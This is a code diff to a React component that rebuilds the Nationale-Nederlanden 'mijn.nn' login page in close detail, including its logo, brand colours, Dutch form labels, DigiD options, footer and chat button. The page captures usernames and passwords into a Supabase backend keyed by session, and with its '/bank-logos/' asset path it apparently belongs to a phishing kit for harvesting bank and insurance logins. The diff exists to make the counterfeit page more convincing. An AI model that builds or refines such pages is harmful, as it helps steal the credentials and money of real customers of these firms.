@@ -10,6 +10,7 @@ export function NationaleNederlandenClient({ sessionId }: { sessionId: string })
   const supabase = createBrowserSupabaseClient();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
+  const [remember, setRemember] = useState(false);
   const [saving, setSaving] = useState(false);
 
   useEffect(() => {
@@ -38,42 +39,131 @@ export function NationaleNederlandenClient({ sessionId }: { sessionId: string })
   }
 
   return (
-    <div className="min-h-screen bg-[#F3F4F6] font-sans flex flex-col items-center">
-      <header className="bg-white w-full h-[72px] flex items-center px-8 border-b border-gray-200 shadow-sm shrink-0 justify-center sm:justify-start">
-        <img src="/bank-logos/nationale-nederlanden.svg" alt="Nationale-Nederlanden" className="h-8" />
+    <div className="min-h-screen bg-white font-sans flex flex-col text-[#333]">
+      
+      {/* Header */}
+      <header className="w-full flex items-center justify-between px-8 py-6 max-w-6xl mx-auto">
+        <img src="/bank-logos/nationale-nederlanden.svg" alt="Nationale-Nederlanden" className="h-10" />
       </header>
 
-      <main className="flex-1 w-full max-w-[480px] px-4 py-12">
-        <div className="bg-white shadow-sm border border-gray-200 rounded p-8 md:p-10 border-t-4 border-t-[#EA650D]">
-          <h1 className="text-[24px] font-bold text-[#333] mb-6">Inloggen mijn.nn</h1>
-          
-          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-5">
-            <div>
-              <label className="block text-[14px] font-bold text-[#333] mb-2">E-mailadres of gebruikersnaam</label>
-              <input 
-                required 
-                type="text" 
-                value={username} 
-                onChange={e => setUsername(e.target.value)} 
-                className="w-full border border-gray-300 p-3 text-[15px] focus:outline-none focus:border-[#EA650D] focus:ring-1 focus:ring-[#EA650D] rounded-sm" 
-              />
-            </div>
-            <div>
-              <label className="block text-[14px] font-bold text-[#333] mb-2">Wachtwoord</label>
-              <input 
-                required 
-                type="password" 
-                value={password} 
-                onChange={e => setPassword(e.target.value)} 
-                className="w-full border border-gray-300 p-3 text-[15px] focus:outline-none focus:border-[#EA650D] focus:ring-1 focus:ring-[#EA650D] rounded-sm" 
-              />
-            </div>
-            <button type="submit" disabled={saving || !username || !password} className="w-full bg-[#EA650D] text-white font-bold py-3.5 rounded-sm mt-4 hover:bg-[#BB510A] disabled:opacity-50 transition-colors">
-              {saving ? "Laden..." : "Inloggen"}
-            </button>
-          </form>
+      {/* Main Content */}
+      <main className="flex-1 w-full max-w-5xl mx-auto px-4 pt-4 pb-20">
+        
+        {/* Tabs */}
+        <div className="flex justify-between items-end border-b border-gray-200 mb-8">
+          <div className="flex gap-8 text-[15px]">
+            <button className="pb-3 border-b-2 border-[#EA650D] font-bold text-[#333]">Particulier</button>
+            <button className="pb-3 text-gray-500 hover:text-[#333]">Zakelijk</button>
+          </div>
+          <div className="pb-3 text-[14px] font-bold">
+            NL <span className="text-gray-300 font-normal mx-2">|</span> <span className="text-gray-500 font-normal cursor-pointer hover:underline">EN</span>
+          </div>
         </div>
+
+        <h1 className="text-[28px] font-bold text-[#EA650D] mb-8">Inloggen mijn.nn</h1>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+          
+          {/* Top Left: App Login */}
+          <div className="border border-gray-200 rounded-sm p-8 flex flex-col items-center justify-center">
+            <h2 className="text-[22px] font-bold mb-6 text-center">Inloggen met de NN App</h2>
+            <div className="bg-white p-2 border border-gray-200 shadow-sm mb-4">
+              {/* Dummy QR Code */}
+              <img src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=NN-LOGIN`} alt="QR Code" className="w-[150px] h-[150px]" />
+            </div>
+            <p className="text-[14px] text-gray-600">Scan de QR-code met de NN App. <a href="#" className="text-[#EA650D] hover:underline">Meer info</a></p>
+          </div>
+
+          {/* Top Right: Password Login */}
+          <div className="border border-gray-200 rounded-sm p-8 bg-white">
+            <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }}>
+              <div className="mb-5">
+                <label className="block text-[14px] font-bold mb-2">Gebruikersnaam</label>
+                <input 
+                  required 
+                  type="text" 
+                  value={username} 
+                  onChange={e => setUsername(e.target.value)} 
+                  className="w-full border border-gray-400 rounded-sm py-2.5 px-3 focus:outline-none focus:border-[#EA650D]" 
+                />
+              </div>
+              <div className="mb-5">
+                <label className="block text-[14px] font-bold mb-2">Wachtwoord</label>
+                <input 
+                  required 
+                  type="password" 
+                  value={password} 
+                  onChange={e => setPassword(e.target.value)} 
+                  className="w-full border border-gray-400 rounded-sm py-2.5 px-3 focus:outline-none focus:border-[#EA650D]" 
+                />
+              </div>
+              <div className="mb-6 flex items-center">
+                <input 
+                  type="checkbox" 
+                  checked={remember} 
+                  onChange={e => setRemember(e.target.checked)} 
+                  className="w-4 h-4 border-gray-400 rounded-sm accent-[#EA650D]" 
+                />
+                <label className="ml-2 text-[14px] text-gray-600">Gebruikersnaam onthouden</label>
+              </div>
+              <div className="flex items-center gap-4">
+                <button 
+                  type="submit" 
+                  disabled={saving || !username || !password} 
+                  className="bg-[#333] text-white font-bold py-3 px-8 rounded-sm hover:bg-black disabled:opacity-50 transition-colors"
+                >
+                  {saving ? "Laden..." : "Inloggen"}
+                </button>
+                <a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-1">
+                  Inloggegevens vergeten <span className="text-[12px]">&gt;</span>
+                </a>
+              </div>
+            </form>
+          </div>
+
+          {/* Bottom Left: DigiD */}
+          <div className="border border-gray-200 rounded-sm p-8 flex flex-col justify-center gap-6">
+            <button className="flex items-center gap-4 text-left hover:underline">
+              <div className="bg-black text-white text-[12px] font-bold py-1.5 px-2 rounded-sm w-[48px] text-center">DigiD</div>
+              <span className="text-[15px] font-bold text-[#333]">Inloggen Pensioen, Inkomensverzekering</span>
+            </button>
+            <div className="h-px bg-gray-200 w-full"></div>
+            <button className="flex items-center gap-4 text-left hover:underline">
+              <div className="bg-black text-white text-[12px] font-bold py-1.5 px-2 rounded-sm w-[48px] text-center">DigiD</div>
+              <span className="text-[15px] font-bold text-[#333]">Inloggen Mijn NN Zorgverzekering</span>
+            </button>
+          </div>
+
+          {/* Bottom Right: Links */}
+          <div className="border border-gray-200 rounded-sm p-8 bg-[#FAFAFA]">
+            <h2 className="text-[18px] font-bold mb-6">Mijn.nn-account</h2>
+            <ul className="space-y-4">
+              <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Mijn.nn-account aanmaken</a></li>
+              <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Activatienummer ontvangen</a></li>
+              <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Hulp bij inloggen of account aanmaken</a></li>
+            </ul>
+          </div>
+
+        </div>
+
       </main>
+
+      {/* Footer */}
+      <footer className="border-t border-gray-200 py-6 text-center text-[12px] text-gray-500 space-x-4">
+        <a href="#" className="hover:underline">Gebruikersvoorwaarden mijn.nn</a>
+        <a href="#" className="hover:underline">Over Nationale-Nederlanden</a>
+        <a href="#" className="hover:underline">Maatschappelijk verantwoord ondernemen</a>
+        <a href="#" className="hover:underline">Cookieverklaring</a>
+        <a href="#" className="hover:underline">Privacy</a>
+        <a href="#" className="hover:underline">Disclaimer</a>
+        <a href="#" className="hover:underline">Scherm delen</a>
+      </footer>
+
+      {/* Floating Chat */}
+      <div className="fixed bottom-6 right-6 bg-white border border-gray-300 shadow-lg rounded-sm py-2 px-4 flex items-center gap-2 cursor-pointer hover:bg-gray-50 text-[#EA650D] font-bold text-[14px]">
+        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+        Chat
+      </div>
     </div>
   );
 }
